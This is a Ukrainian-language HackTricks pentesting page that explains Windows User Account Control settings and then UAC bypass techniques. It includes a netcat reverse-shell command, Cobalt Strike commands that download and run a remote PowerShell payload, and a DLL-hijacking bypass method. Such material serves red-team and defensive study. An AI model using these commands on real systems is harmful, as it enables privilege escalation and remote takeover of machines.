# UAC - User Account Control

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію в рекламі HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Дізнайтеся про [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Використовуйте [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) для легкої побудови та **автоматизації робочих процесів** за допомогою найбільш **продвинутих інструментів спільноти** у світі.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Контроль облікових записів користувачів (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) - це функція, яка дозволяє **запит на підтвердження для підвищених дій**. Додатки мають різні рівні `цілісності`, і програма з **високим рівнем** може виконувати завдання, які **потенційно можуть підірвати систему**. Коли UAC увімкнено, додатки та завдання завжди **виконуються в контексті безпеки облікового запису неадміністратора**, якщо адміністратор не надає цим додаткам/завданням явний дозвіл на доступ рівня адміністратора до системи. Це зручна функція, яка захищає адміністраторів від ненавмисних змін, але не вважається межею безпеки.

Для отримання додаткової інформації про рівні цілісності:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Коли UAC працює, користувачу-адміністратору надаються 2 токени: стандартний ключ користувача для виконання звичайних дій на звичайному рівні та один з привілеями адміністратора.

Ця [сторінка](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) розглядає, як працює UAC докладно і включає процес входу, досвід користувача та архітектуру UAC. Адміністратори можуть використовувати політику безпеки для налаштування роботи UAC специфічно для своєї організації на локальному рівні (за допомогою secpol.msc) або налаштовувати та розповсюджувати через об'єкти політики груп (GPO) в середовищі домену Active Directory. Різні налаштування розглядаються докладно [тут](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Існує 10 налаштувань групової політики, які можна встановити для UAC. У таблиці наведено додаткові подробиці:

| Налаштування групової політики                                                                                                                                                                                                                                                                                                                                                                           | Ключ реєстру                | Налаштування за замовчуванням                                                      |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------- | ---------------------------------------------------------------------------------- |
| [Контроль облікових записів користувачів: Режим затвердження адміністратора для вбудованого облікового запису адміністратора](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                    | FilterAdministratorToken    | Вимкнено                                                                           |
| [Контроль облікових записів користувачів: Дозволити додаткам UIAccess викликати підвищення без використання безпечного робочого столу](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Вимкнено                                                                           |
| [Контроль облікових записів користувачів: Поведінка вікна підвищення для адміністраторів у режимі затвердження адміністратора](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                   | ConsentPromptBehaviorAdmin  | Запит на згоду для не-Windows бінарних файлів                                      |
| [Контроль облікових записів користувачів: Поведінка вікна підвищення для стандартних користувачів](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                      | ConsentPromptBehaviorUser   | Запит на облікові дані на безпечному робочому столі                                |
| [Контроль облікових записів користувачів: Виявлення встановлення додатків та запит на підвищення](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                 | EnableInstallerDetection    | Увімкнено (за замовчуванням для дому) Вимкнено (за замовчуванням для підприємства) |
| [Контроль облікових записів користувачів: Підвищувати лише виконувані файли, які підписані та перевірені](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                            | ValidateAdminCodeSignatures | Вимкнено                                                                           |
| [Контроль облікових записів користувачів: Підвищувати лише додатки UIAccess, які встановлені в безпечних місцях](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                  | EnableSecureUIAPaths        | Увімкнено                                                                          |
| [Контроль облікових записів користувачів: Запускати всіх адміністраторів у режимі затвердження адміністратора](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                | EnableLUA                   | Увімкнено                                                                          |
| [Контроль облікових записів користувачів: Перемикати на безпечний робочий стіл при запиті на підвищення](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                          | PromptOnSecureDesktop       | Увімкнено                                                                          |
| [Контроль облікових записів користувачів: Віртуалізувати помилки запису файлів та реєстру в місцях для кожного користувача](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                               | EnableVirtualization        | Увімкнено                                                                          |
| ### Теорія обхіду UAC                                                                                                                                                                                                                                                                                                                                                                                    |                             |                                                                                    |

Деякі програми **автоматично підвищуються** якщо **користувач належить** до **групи адміністраторів**. Ці виконувані файли мають у своєму _**Маніфесті**_ параметр _**autoElevate**_ зі значенням _**True**_. Крім того, виконуваний файл повинен бути **підписаний Microsoft**.

Отже, для **обхіду** **UAC** (підвищення рівня доступу з **середнього** до **високого**) деякі зловмисники використовують ці виконувані файли для **виконання довільного коду**, оскільки він буде виконаний з процесу з **високим рівнем доступу**.

Ви можете **перевірити** _**Маніфест**_ виконуваного файлу за допомогою інструменту _**sigcheck.exe**_ від Sysinternals. І ви можете **переглянути** рівень **доступу** процесів за допомогою _Process Explorer_ або _Process Monitor_ (від Sysinternals).

### Перевірка UAC

Щоб підтвердити, що UAC увімкнено, виконайте:

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```

Якщо це **`1`**, то UAC **активовано**, якщо це **`0`** або **не існує**, то UAC **неактивовано**.

Потім перевірте, **який рівень** налаштований:

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

* Якщо **`0`**, то UAC не буде запитувати (як **вимкнено**)
* Якщо **`1`**, адміністратор **попросить ввести ім'я користувача та пароль**, щоб виконати виконуваний файл з високими правами (на захищеному робочому столі)
* Якщо **`2`** (**Завжди повідомляти мене**), UAC завжди буде запитувати підтвердження від адміністратора, коли він спробує виконати щось з високими привілеями (на захищеному робочому столі)
* Якщо **`3`** схоже на `1`, але не обов'язково на захищеному робочому столі
* Якщо **`4`** схоже на `2`, але не обов'язково на захищеному робочому столі
* Якщо **`5`** (**типово**), він попросить адміністратора підтвердити запуск не віконних бінарних файлів з високими привілеями

Потім вам потрібно переглянути значення **`LocalAccountTokenFilterPolicy`**\
Якщо значення **`0`**, тоді тільки користувач **RID 500** (**вбудований адміністратор**) може виконувати **адміністративні завдання без UAC**, а якщо це `1`, **всі облікові записи в групі "Адміністратори"** можуть це робити.

І, нарешті, перегляньте значення ключа **`FilterAdministratorToken`**\
Якщо **`0`**(типово), обліковий запис **вбудованого адміністратора може** виконувати віддалені адміністративні завдання, а якщо **`1`**, обліковий запис вбудованого адміністратора **не може** виконувати віддалені адміністративні завдання, якщо `LocalAccountTokenFilterPolicy` встановлено на `1`.

#### Підсумок

* Якщо `EnableLUA=0` або **не існує**, **немає UAC для нікого**
* Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=1`, немає UAC для нікого**
* Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=0` і `FilterAdministratorToken=0`, немає UAC для RID 500 (Вбудований адміністратор)**
* Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=0` і `FilterAdministratorToken=1`, UAC для всіх**

Усю цю інформацію можна отримати за допомогою модуля **metasploit**: `post/windows/gather/win_privs`

Ви також можете перевірити групи вашого користувача та отримати рівень цілісності:

```
net user %username%
whoami /groups | findstr Level
```

## Обхід UAC

{% hint style="info" %}
Зверніть увагу, що якщо у вас є графічний доступ до жертви, обхід UAC простий, оскільки ви можете просто клацнути "Так", коли з'явиться запит UAC.
{% endhint %}

Обхід UAC потрібний в такій ситуації: **UAC активовано, ваш процес працює в контексті середньої цілісності, і ваш користувач належить до групи адміністраторів**.

Важливо зазначити, що **набагато складніше обійти UAC, якщо він має найвищий рівень безпеки (Always), ніж якщо він має будь-який інший рівень (Default).**

### UAC вимкнено

Якщо UAC вже вимкнено (`ConsentPromptBehaviorAdmin` **`0`**), ви можете **виконати зворотний shell з правами адміністратора** (високий рівень цілісності), використовуючи щось на зразок:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC обхід з дублюванням токенів

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Дуже** простий UAC "обхід" (повний доступ до файлової системи)

Якщо у вас є оболонка з користувачем, який знаходиться в групі Адміністраторів, ви можете **підключити C$** через SMB (файлову систему) локально на новий диск і матимете **доступ до всього в межах файлової системи** (навіть домашньої папки адміністратора).

{% hint style="warning" %}
**Здається, що цей трюк більше не працює**
{% endhint %}

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Ухилення UAC за допомогою cobalt strike

Техніки Cobalt Strike будуть працювати лише у випадку, якщо UAC не встановлено на максимальний рівень безпеки

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** та **Metasploit** також мають кілька модулів для **обхідної** **UAC**.

### KRBUACBypass

Документація та інструмент за посиланням [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Використання уразливостей обходу UAC

[**UACME**](https://github.com/hfiref0x/UACME) - це **компіляція** кількох уразливостей обходу UAC. Зверніть увагу, що вам потрібно буде **скомпілювати UACME за допомогою Visual Studio або MSBuild**. Під час компіляції буде створено кілька виконуваних файлів (наприклад, `Source\Akagi\outout\x64\Debug\Akagi.exe`), вам потрібно буде знати, **який саме вам потрібен.**\
Варто **бути обережним**, оскільки деякі обходи можуть **спонукати інші програми**, які **повідомлять користувача**, що щось відбувається.

У UACME є **версія збірки, з якої почав працювати кожний метод**. Ви можете шукати метод, який впливає на ваші версії:

```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Також, використовуючи [цю](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) сторінку, ви отримуєте версію Windows `1607` зі збірки.

#### Ще більше обхідів UAC

**Всі** техніки, використані тут для обходу AUC, **потребують** **повного інтерактивного шелу** з жертвою (звичайний шел nc.exe не достатньо).

Ви можете отримати сеанс **meterpreter**. Перейдіть до **процесу**, у якого значення **Session** дорівнює **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ має працювати)

### Обхід UAC з GUI

Якщо у вас є доступ до **GUI, ви можете просто прийняти запит UAC**, коли ви його отримаєте, вам не потрібно його обходити. Таким чином, отримання доступу до GUI дозволить вам обійти UAC.

Більше того, якщо ви отримаєте сеанс GUI, яким хтось користувався (потенційно через RDP), там є **деякі інструменти, які будуть працювати в якості адміністратора**, звідки ви зможете **запустити** наприклад **cmd** **як адміністратор** без повторного запиту від UAC, як [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути трохи **прихованіше**.

### Гучний обхід UAC методом брутфорсу

Якщо вас не турбує шум, ви завжди можете **запустити щось на кшталт** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), що **просить підвищити дозволи, поки користувач не погодиться**.

### Власний обхід - Основна методологія обходу UAC

Якщо ви подивитесь на **UACME**, ви помітите, що **більшість обходів UAC використовують уразливість Dll Hijacking** (головним чином записуючи шкідливу dll на _C:\Windows\System32_). [Прочитайте це, щоб дізнатися, як знайти уразливість Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/).

1. Знайдіть бінарний файл, який **автоматично підвищує** (перевірте, що при його виконанні він працює на високому рівні цілісності).
2. За допомогою procmon знайдіть події "**NAME NOT FOUND**", які можуть бути вразливі до **DLL Hijacking**.
3. Ймовірно, вам доведеться **записати** DLL всередині деяких **захищених шляхів** (наприклад, C:\Windows\System32), де у вас немає прав на запис. Ви можете обійти це, використовуючи:
4. **wusa.exe**: Windows 7,8 та 8.1. Він дозволяє видобувати вміст файлу CAB всередині захищених шляхів (тому що цей інструмент виконується на високому рівні цілісності).
5. **IFileOperation**: Windows 10.
6. Підготуйте **скрипт**, щоб скопіювати ваш DLL всередину захищеного шляху та виконати вразливий та автоматично підвищений бінарний файл.

### Ще одна техніка обходу UAC

Полягає в тому, що спостерігається, як **автоматично підвищений бінарний файл** намагається **читати** з **реєстру** **ім'я/шлях** **бінарного файлу** або **команди** для **виконання** (це цікавіше, якщо бінарний файл шукає цю інформацію всередині **HKCU**).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Використовуйте [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), щоб легко створювати та **автоматизувати робочі процеси**, підтримувані найбільш **продвинутими** інструментами спільноти у світі.\
Отримайте доступ сьогодні:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
